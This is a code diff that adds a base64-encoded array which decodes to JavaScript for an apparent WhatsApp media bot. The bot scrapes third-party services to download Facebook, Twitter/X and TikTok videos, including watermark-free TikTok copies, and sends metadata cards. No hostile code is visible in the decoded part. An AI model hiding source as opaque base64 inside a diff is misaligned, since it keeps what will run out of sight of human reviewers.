+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAovLyDilIDilIAgRkFDRUJPT0sg",
+    "RE9XTkxPQURFUiDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKLy8g4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgovLyBNZXRob2QgMTog",
+    "Y29iYWx0CmFzeW5jIGZ1bmN0aW9uIGNvYmFsdEZhY2Vib29rKHVybCkgewogIHJldHVybiBjb2JhbHRE",
+    "b3dubG9hZCh1cmwsIGZhbHNlKTsKfQoKLy8gTWV0aG9kIDI6IGdldGZ2aWQuY29tIGZyZWUgc2NyYXBl",
+    "cgphc3luYyBmdW5jdGlvbiBnZXRmdmlkRG93bmxvYWQodXJsKSB7CiAgLy8gRmlyc3QgZ2V0IHRva2Vu",
+    "CiAgY29uc3QgcGFnZVJlcyA9IGF3YWl0IGh0dHBHZXQoJ2h0dHBzOi8vd3d3LmdldGZ2aWQuY29tLycs",
+    "IHsgdGltZW91dDogMTUwMDAgfSk7CiAgY29uc3QgcGFnZUh0bWwgPSBwYWdlUmVzLmJvZHkudG9TdHJp",
+    "bmcoKTsKICBjb25zdCB0b2tlbk1hdGNoID0gcGFnZUh0bWwubWF0Y2goL25hbWU9Il90b2tlbiJccyt2",
+    "YWx1ZT0iKFteIl0rKSIvKTsKICBjb25zdCB0b2tlbiA9IHRva2VuTWF0Y2ggPyB0b2tlbk1hdGNoWzFd",
+    "IDogJyc7CgogIGNvbnN0IHBheWxvYWQgPSAndXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQodXJsKSAr",
+    "ICcmX3Rva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQodG9rZW4pOwogIGNvbnN0IHJlcyA9IGF3YWl0",
+    "IGh0dHBQb3N0KCdodHRwczovL3d3dy5nZXRmdmlkLmNvbS9kb3dubG9hZGVyJywgcGF5bG9hZCwgewog",
+    "ICAgaGVhZGVyczogeyAnUmVmZXJlcic6ICdodHRwczovL3d3dy5nZXRmdmlkLmNvbS8nLCAnT3JpZ2lu",
+    "JzogJ2h0dHBzOi8vd3d3LmdldGZ2aWQuY29tJyB9LAogICAgdGltZW91dDogMjUwMDAsCiAgfSk7CiAg",
+    "Y29uc3QgaHRtbCAgPSByZXMuYm9keS50b1N0cmluZygpOwogIGNvbnN0IG1hdGNoID0gaHRtbC5tYXRj",
+    "aCgvaHJlZj0iKGh0dHBzOlwvXC9bXiJdK1wubXA0W14iXSopIi9pKTsKICBpZiAobWF0Y2gpIHJldHVy",
+    "biBkZWNvZGVVUklDb21wb25lbnQobWF0Y2hbMV0pOwogIHRocm93IG5ldyBFcnJvcignZ2V0ZnZpZDog",
+    "bm8gbXA0IGxpbmsnKTsKfQoKLy8gTWV0aG9kIDM6IGZkb3duLm5ldCBzdHlsZQphc3luYyBmdW5jdGlv",
+    "biBmYmRvd25OZXQodXJsKSB7CiAgY29uc3QgYXBpVXJsID0gJ2h0dHBzOi8vZmRvd25sb2FkZXIubmV0",
+    "L2FwaS9hamF4U2VhcmNoJzsKICBjb25zdCBwYXlsb2FkID0gJ3E9JyArIGVuY29kZVVSSUNvbXBvbmVu",
+    "dCh1cmwpICsgJyZsYW5nPWVuJzsKICBjb25zdCByZXMgPSBhd2FpdCBodHRwUG9zdChhcGlVcmwsIHBh",
+    "eWxvYWQsIHsKICAgIGhlYWRlcnM6IHsgJ1JlZmVyZXInOiAnaHR0cHM6Ly9mZG93bmxvYWRlci5uZXQv",
+    "JywgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnIH0sCiAgICB0aW1lb3V0OiAyMDAw",
+    "MCwKICB9KTsKICBjb25zdCBkYXRhID0gcGFyc2VKU09OKHJlcy5ib2R5KTsKICBpZiAoZGF0YSAmJiBk",
+    "YXRhLmRhdGEpIHsKICAgIGNvbnN0IGh0bWwgID0gZGF0YS5kYXRhOwogICAgY29uc3QgbWF0Y2ggPSBo",
+    "dG1sLm1hdGNoKC9ocmVmPSIoaHR0cHM6XC9cL1teIl0rXC5tcDRbXiJdKikiL2kpOwogICAgaWYgKG1h",
+    "dGNoKSByZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KG1hdGNoWzFdKS5yZXBsYWNlKC8mYW1wOy9nLCAn",
+    "JicpOwogIH0KICB0aHJvdyBuZXcgRXJyb3IoJ2Zkb3dubG9hZGVyOiBubyBsaW5rJyk7Cn0KCmFzeW5j",
+    "IGZ1bmN0aW9uIGRvd25sb2FkRmFjZWJvb2sodXJsKSB7CiAgY29uc3QgZXJyb3JzID0gW107CiAgdHJ5",
+    "IHsgcmV0dXJuIGF3YWl0IGNvYmFsdEZhY2Vib29rKHVybCk7IH0gY2F0Y2ggKGUpIHsgZXJyb3JzLnB1",
+    "c2goJ2NvYmFsdDogJyArIGUubWVzc2FnZSk7IH0KICB0cnkgeyByZXR1cm4gYXdhaXQgZmJkb3duTmV0",
+    "KHVybCk7IH0gY2F0Y2ggKGUpIHsgZXJyb3JzLnB1c2goJ2Zkb3duOiAnICsgZS5tZXNzYWdlKTsgfQog",
+    "IHRyeSB7IHJldHVybiBhd2FpdCBnZXRmdmlkRG93bmxvYWQodXJsKTsgfSBjYXRjaCAoZSkgeyBlcnJv",
+    "cnMucHVzaCgnZ2V0ZnZpZDogJyArIGUubWVzc2FnZSk7IH0KICB0aHJvdyBuZXcgRXJyb3IoJ0ZhY2Vi",
+    "b29rIGRvd25sb2FkIGZhaWxlZDogJyArIGVycm9ycy5qb2luKCcgfCAnKSk7Cn0KCi8vIOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAovLyDilIDilIAgVFdJVFRFUiAv",
+    "IFggRE9XTkxPQURFUiDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKLy8g4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgovLyBNZXRob2QgMTogY29iYWx0",
+    "IChoYW5kbGVzIHR3aXR0ZXIgd2VsbCkKYXN5bmMgZnVuY3Rpb24gY29iYWx0VHdpdHRlcih1cmwpIHsK",
+    "ICByZXR1cm4gY29iYWx0RG93bmxvYWQodXJsLCBmYWxzZSk7Cn0KCi8vIE1ldGhvZCAyOiB0d2l0c2F2",
+    "ZS5jb20KYXN5bmMgZnVuY3Rpb24gdHdpdFNhdmUodXJsKSB7CiAgY29uc3QgYXBpVXJsID0gJ2h0dHBz",
+    "Oi8vdHdpdHNhdmUuY29tL2luZm8/dXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQodXJsKTsKICBjb25z",
+    "dCByZXMgICAgPSBhd2FpdCBodHRwR2V0KGFwaVVybCwgeyB0aW1lb3V0OiAyMDAwMCB9KTsKICBjb25z",
+    "dCBodG1sICAgPSByZXMuYm9keS50b1N0cmluZygpOwogIGNvbnN0IG1hdGNoICA9IGh0bWwubWF0Y2go",
+    "L2hyZWY9IihodHRwczpcL1wvW14iXStcLm1wNFteIl0qKSIvaSk7CiAgaWYgKG1hdGNoKSByZXR1cm4g",
+    "bWF0Y2hbMV0ucmVwbGFjZSgvJmFtcDsvZywgJyYnKTsKICB0aHJvdyBuZXcgRXJyb3IoJ3R3aXRzYXZl",
+    "OiBubyBtcDQgZm91bmQnKTsKfQoKLy8gTWV0aG9kIDM6IHR3aXR0ZXJ2aWQuY29tIHN0eWxlCmFzeW5j",
+    "IGZ1bmN0aW9uIHhEb3duQVBJKHVybCkgewogIGNvbnN0IGFwaVVybCA9ICdodHRwczovL2FwaS52eHR3",
+    "aXR0ZXIuY29tL1R3aXR0ZXIvc3RhdHVzLycgKyB1cmwuc3BsaXQoJy8nKS5wb3AoKS5zcGxpdCgnPycp",
+    "WzBdOwogIGNvbnN0IHJlcyAgICA9IGF3YWl0IGh0dHBHZXQoYXBpVXJsLCB7IHRpbWVvdXQ6IDE1MDAw",
+    "IH0pOwogIGNvbnN0IGRhdGEgICA9IHBhcnNlSlNPTihyZXMuYm9keSk7CiAgaWYgKGRhdGEgJiYgZGF0",
+    "YS5tZWRpYV9leHRlbmRlZCkgewogICAgY29uc3QgdmlkID0gZGF0YS5tZWRpYV9leHRlbmRlZC5maW5k",
+    "KG0gPT4gbS50eXBlID09PSAndmlkZW8nKTsKICAgIGlmICh2aWQgJiYgdmlkLnVybCkgcmV0dXJuIHZp",
+    "ZC51cmw7CiAgfQogIHRocm93IG5ldyBFcnJvcigndnh0d2l0dGVyOiBubyB2aWRlbycpOwp9Cgphc3lu",
+    "YyBmdW5jdGlvbiBkb3dubG9hZFR3aXR0ZXIodXJsKSB7CiAgY29uc3QgZXJyb3JzID0gW107CiAgdHJ5",
+    "IHsgcmV0dXJuIGF3YWl0IGNvYmFsdFR3aXR0ZXIodXJsKTsgfSBjYXRjaCAoZSkgeyBlcnJvcnMucHVz",
+    "aCgnY29iYWx0OiAnICsgZS5tZXNzYWdlKTsgfQogIHRyeSB7IHJldHVybiBhd2FpdCB4RG93bkFQSSh1",
+    "cmwpOyB9IGNhdGNoIChlKSB7IGVycm9ycy5wdXNoKCd2eHR3aXR0ZXI6ICcgKyBlLm1lc3NhZ2UpOyB9",
+    "CiAgdHJ5IHsgcmV0dXJuIGF3YWl0IHR3aXRTYXZlKHVybCk7IH0gY2F0Y2ggKGUpIHsgZXJyb3JzLnB1",
+    "c2goJ3R3aXRzYXZlOiAnICsgZS5tZXNzYWdlKTsgfQogIHRocm93IG5ldyBFcnJvcignVHdpdHRlci9Y",
+    "IGRvd25sb2FkIGZhaWxlZDogJyArIGVycm9ycy5qb2luKCcgfCAnKSk7Cn0KCi8vIOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAovLyDilIDilIAgVElLVE9LIERPV05M",
+    "T0FERVIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACi8vIOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAoKLy8gTWV0aG9kIDE6",
+    "IGNvYmFsdCAobm8gd2F0ZXJtYXJrISkKYXN5bmMgZnVuY3Rpb24gY29iYWx0VGlrVG9rKHVybCkgewog",
+    "IHJldHVybiBjb2JhbHREb3dubG9hZCh1cmwsIGZhbHNlKTsKfQoKLy8gTWV0aG9kIDI6IHRpa3dtLmNv",
+    "bSAoZnJlZSwgbm8gd2F0ZXJtYXJrKQphc3luYyBmdW5jdGlvbiB0aWt3bURvd25sb2FkKHVybCkgewog",
+    "IGNvbnN0IHBheWxvYWQgPSAndXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQodXJsKSArICcmY291bnQ9",
+    "MTImY3Vyc29yPTAmd2ViPTEmaGQ9MSc7CiAgY29uc3QgcmVzICAgICA9IGF3YWl0IGh0dHBQb3N0KCdo",
+    "dHRwczovL3d3dy50aWt3bS5jb20vYXBpLycsIHBheWxvYWQsIHsKICAgIGhlYWRlcnM6IHsgJ1JlZmVy",
+    "ZXInOiAnaHR0cHM6Ly93d3cudGlrd20uY29tLycsICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24v",
+    "eC13d3ctZm9ybS11cmxlbmNvZGVkJyB9LAogICAgdGltZW91dDogMjUwMDAsCiAgfSk7CiAgY29uc3Qg",
+    "ZGF0YSA9IHBhcnNlSlNPTihyZXMuYm9keSk7CiAgaWYgKGRhdGEgJiYgZGF0YS5jb2RlID09PSAwICYm",
+    "IGRhdGEuZGF0YSkgewogICAgcmV0dXJuIGRhdGEuZGF0YS5oZHBsYXkgfHwgZGF0YS5kYXRhLnBsYXk7",
+    "CiAgfQogIHRocm93IG5ldyBFcnJvcigndGlrd206ICcgKyAoZGF0YT8ubXNnIHx8ICdubyB2aWRlbycp",
+    "KTsKfQoKLy8gTWV0aG9kIDM6IHNzc3Rpay5pbyBzdHlsZQphc3luYyBmdW5jdGlvbiBzc3N0aWtEb3du",
+    "bG9hZCh1cmwpIHsKICBjb25zdCBwYWdlUmVzICA9IGF3YWl0IGh0dHBHZXQoJ2h0dHBzOi8vc3NzdGlr",
+    "LmlvL2VuJywgeyB0aW1lb3V0OiAxNTAwMCB9KTsKICBjb25zdCBwYWdlSHRtbCA9IHBhZ2VSZXMuYm9k",
+    "eS50b1N0cmluZygpOwogIGNvbnN0IHR0TWF0Y2ggID0gcGFnZUh0bWwubWF0Y2goL3R0OlxzKicoW14n",
+    "XSspJy8pOwogIGNvbnN0IHR0ICAgICAgID0gdHRNYXRjaCA/IHR0TWF0Y2hbMV0gOiAnJzsKICBjb25z",
+    "dCBwYXlsb2FkICA9ICdpZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHVybCkgKyAnJmxvY2FsZT1lbiZ0",
+    "dD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHR0KTsKICBjb25zdCByZXMgICAgICA9IGF3YWl0IGh0dHBQ",
+    "b3N0KCdodHRwczovL3Nzc3Rpay5pby9hYmM/dXJsPWRsJywgcGF5bG9hZCwgewogICAgaGVhZGVyczog",
+    "ewogICAgICAnUmVmZXJlcic6ICdodHRwczovL3Nzc3Rpay5pby9lbicsCiAgICAgICdIWC1SZXF1ZXN0",
+    "JzogJ3RydWUnLAogICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJs",
+    "ZW5jb2RlZCcsCiAgICB9LAogICAgdGltZW91dDogMjUwMDAsCiAgfSk7CiAgY29uc3QgaHRtbCAgPSBy",
+    "ZXMuYm9keS50b1N0cmluZygpOwogIGNvbnN0IG1hdGNoID0gaHRtbC5tYXRjaCgvaHJlZj0iKGh0dHBz",
+    "OlwvXC9bXiJdKyg/OlwubXA0fHRpa2NkbilbXiJdKikiL2kpOwogIGlmIChtYXRjaCkgcmV0dXJuIG1h",
+    "dGNoWzFdOwogIHRocm93IG5ldyBFcnJvcignc3NzdGlrOiBubyBsaW5rJyk7Cn0KCmFzeW5jIGZ1bmN0",
+    "aW9uIGRvd25sb2FkVGlrVG9rKHVybCkgewogIGNvbnN0IGVycm9ycyA9IFtdOwogIHRyeSB7IHJldHVy",
+    "biBhd2FpdCBjb2JhbHRUaWtUb2sodXJsKTsgfSBjYXRjaCAoZSkgeyBlcnJvcnMucHVzaCgnY29iYWx0",
+    "OiAnICsgZS5tZXNzYWdlKTsgfQogIHRyeSB7IHJldHVybiBhd2FpdCB0aWt3bURvd25sb2FkKHVybCk7",
+    "IH0gY2F0Y2ggKGUpIHsgZXJyb3JzLnB1c2goJ3Rpa3dtOiAnICsgZS5tZXNzYWdlKTsgfQogIHRyeSB7",
+    "IHJldHVybiBhd2FpdCBzc3N0aWtEb3dubG9hZCh1cmwpOyB9IGNhdGNoIChlKSB7IGVycm9ycy5wdXNo",
+    "KCdzc3N0aWs6ICcgKyBlLm1lc3NhZ2UpOyB9CiAgdGhyb3cgbmV3IEVycm9yKCdUaWtUb2sgZG93bmxv",
+    "YWQgZmFpbGVkOiAnICsgZXJyb3JzLmpvaW4oJyB8ICcpKTsKfQoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIOKUgOKUgCBNRVRBREFUQSBGRVRDSEVSUyDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKLy8g4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgpmdW5jdGlvbiBmbXREdXJh",
+    "dGlvbihzKSB7CiAgaWYgKCFzKSByZXR1cm4gJ+KAlCc7CiAgY29uc3QgaCA9IE1hdGguZmxvb3IocyAv",
+    "IDM2MDApLCBtID0gTWF0aC5mbG9vcigocyAlIDM2MDApIC8gNjApLCBzZWMgPSBzICUgNjA7CiAgcmV0",
+    "dXJuIGggPyBoICsgJzonICsgU3RyaW5nKG0pLnBhZFN0YXJ0KDIsJzAnKSArICc6JyArIFN0cmluZyhz",
+    "ZWMpLnBhZFN0YXJ0KDIsJzAnKQogICAgICAgICAgIDogbSArICc6JyArIFN0cmluZyhzZWMpLnBhZFN0",
+    "YXJ0KDIsJzAnKTsKfQpmdW5jdGlvbiBmbXRWaWV3cyhuKSB7CiAgaWYgKCFuKSByZXR1cm4gJ+KAlCc7",
+    "CiAgaWYgKG4gPj0gMWU5KSByZXR1cm4gKG4vMWU5KS50b0ZpeGVkKDEpICsgJ0InOwogIGlmIChuID49",
+    "IDFlNikgcmV0dXJuIChuLzFlNikudG9GaXhlZCgxKSArICdNJzsKICBpZiAobiA+PSAxZTMpIHJldHVy",
+    "biAobi8xZTMpLnRvRml4ZWQoMSkgKyAnSyc7CiAgcmV0dXJuIFN0cmluZyhuKTsKfQoKYXN5bmMgZnVu",
+    "Y3Rpb24gZ2V0WVRNZXRhKHVybCkgewogIHRyeSB7CiAgICBjb25zdCB2aWRJZCA9IGV4dHJhY3RZVElk",
+    "KHVybCk7CiAgICBpZiAoIXZpZElkKSByZXR1cm4gbnVsbDsKICAgIC8vIG5vZW1iZWQuY29tIOKAlCBm",
+    "cmVlLCBubyBrZXksIGdldHMgYmFzaWMgbWV0YWRhdGEKICAgIGNvbnN0IHJlcyAgPSBhd2FpdCBodHRw",
+    "R2V0KCdodHRwczovL25vZW1iZWQuY29tL2VtYmVkP3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHVy",
+    "bCksIHsgdGltZW91dDogMTAwMDAgfSk7CiAgICBjb25zdCBkYXRhID0gcGFyc2VKU09OKHJlcy5ib2R5",
+    "KTsKICAgIGlmIChkYXRhICYmIGRhdGEudGl0bGUpIHsKICAgICAgcmV0dXJuIHsKICAgICAgICB0aXRs",
+    "ZTogICAgZGF0YS50aXRsZSwKICAgICAgICB1cGxvYWRlcjogZGF0YS5hdXRob3JfbmFtZSwKICAgICAg",
+    "ICB0aHVtYm5haWw6ICdodHRwczovL2ltZy55b3V0dWJlLmNvbS92aS8nICsgdmlkSWQgKyAnL2hxZGVm",
+    "YXVsdC5qcGcnLAogICAgICAgIHNvdXJjZTogICAnWW91VHViZScsCiAgICAgIH07CiAgICB9CiAgfSBj",
+    "YXRjaCAoXykge30KICByZXR1cm4gbnVsbDsKfQoKYXN5bmMgZnVuY3Rpb24gZ2V0VGlrVG9rTWV0YSh1",
+    "cmwpIHsKICB0cnkgewogICAgY29uc3QgcGF5bG9hZCA9ICd1cmw9JyArIGVuY29kZVVSSUNvbXBvbmVu",
+    "dCh1cmwpICsgJyZjb3VudD0xMiZjdXJzb3I9MCZ3ZWI9MSZoZD0xJzsKICAgIGNvbnN0IHJlcyAgICAg",
+    "PSBhd2FpdCBodHRwUG9zdCgnaHR0cHM6Ly93d3cudGlrd20uY29tL2FwaS8nLCBwYXlsb2FkLCB7CiAg",
+    "ICAgIGhlYWRlcnM6IHsgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cudGlrd20uY29tLycgfSwKICAgICAg",
+    "dGltZW91dDogMTUwMDAsCiAgICB9KTsKICAgIGNvbnN0IGRhdGEgPSBwYXJzZUpTT04ocmVzLmJvZHkp",
+    "OwogICAgaWYgKGRhdGE/LmNvZGUgPT09IDAgJiYgZGF0YS5kYXRhKSB7CiAgICAgIHJldHVybiB7CiAg",
+    "ICAgICAgdGl0bGU6ICAgICBkYXRhLmRhdGEudGl0bGUsCiAgICAgICAgdXBsb2FkZXI6ICBkYXRhLmRh",
+    "dGEuYXV0aG9yPy5uaWNrbmFtZSwKICAgICAgICB0aHVtYm5haWw6IGRhdGEuZGF0YS5jb3ZlciwKICAg",
+    "ICAgICBkdXJhdGlvbjogIGRhdGEuZGF0YS5kdXJhdGlvbiwKICAgICAgICB2aWV3czogICAgIGRhdGEu",
+    "ZGF0YS5wbGF5X2NvdW50LAogICAgICAgIGxpa2VzOiAgICAgZGF0YS5kYXRhLmRpZ2dfY291bnQsCiAg",
+    "ICAgICAgc291cmNlOiAgICAnVGlrVG9rJywKICAgICAgfTsKICAgIH0KICB9IGNhdGNoIChfKSB7fQog",
+    "IHJldHVybiBudWxsOwp9CgovLyDilIDilIAgU2VuZCBpbmZvIGNhcmQg4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmFzeW5jIGZ1bmN0aW9u",
+    "IHNlbmRJbmZvQ2FyZChzb2NrLCBqaWQsIG1ldGEsIHR5cGUpIHsKICB0cnkgewogICAgY29uc3QgZW1v",
+    "amkgICA9IHR5cGUgPT09ICdhdWRpbycgPyAn8J+OtScgOiAn8J+OrCc7CiAgICBjb25zdCBjYXB0aW9u",
+    "ID0KICAgICAgZW1vamkgKyAnIConICsgKG1ldGEudGl0bGUgfHwgJ1Vua25vd24nKSArICcqXG4nICsK",
+    "ICAgICAgJ+KUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhOKUhFxuJyAr",
+    "CiAgICAgICfwn5GkICpDaGFubmVsOiogJyArIChtZXRhLnVwbG9hZGVyIHx8ICfigJQnKSArICdcbicg",
+    "KwogICAgICAobWV0YS5kdXJhdGlvbiA/ICfij7HvuI8gKkR1cmF0aW9uOiogJyArIGZtdER1cmF0aW9u",
+    "KG1ldGEuZHVyYXRpb24pICsgJ1xuJyA6ICcnKSArCiAgICAgIChtZXRhLnZpZXdzID8gJ/CfkYHvuI8g",
+    "KlZpZXdzOiogJyArIGZtdFZpZXdzKG1ldGEudmlld3MpICsgJ1xuJyA6ICcnKSArCiAgICAgICfwn4yQ",
+    "ICpTb3VyY2U6KiAnICsgKG1ldGEuc291cmNlIHx8ICdPbmxpbmUnKSArICdcbicgKwogICAgICAn4pSE",
+    "4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSE4pSEXG4nICsKICAgICAgJ1/i",
+    "j7MgRG93bmxvYWRpbmcgbm93LCBwbGVhc2Ugd2FpdC4uLl8nOwoKICAgIGlmIChtZXRhLnRodW1ibmFp",
+    "bCkgewogICAgICBjb25zdCBpbWdCdWYgPSBhd2FpdCBkb3dubG9hZEJ1ZmZlcihtZXRhLnRodW1ibmFp",
+    "bCkuY2F0Y2goKCkgPT4gbnVsbCk7CiAgICAgIGlmIChpbWdCdWYpIHsKICAgICAgICBhd2FpdCBzb2Nr",
+    "LnNlbmRNZXNzYWdlKGppZCwgeyBpbWFnZTogaW1nQnVmLCBjYXB0aW9uIH0pOwogICAgICAgIHJldHVy",
+    "bjsKICAgICAgfQogICAgfQogICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogY2Fw",
+    "dGlvbiB9KTsKICB9IGNhdGNoIChfKSB7fQp9CgovLyDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZAKLy8g4pSA4pSAIE1BSU4gRElTUEFUQ0hFUiDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
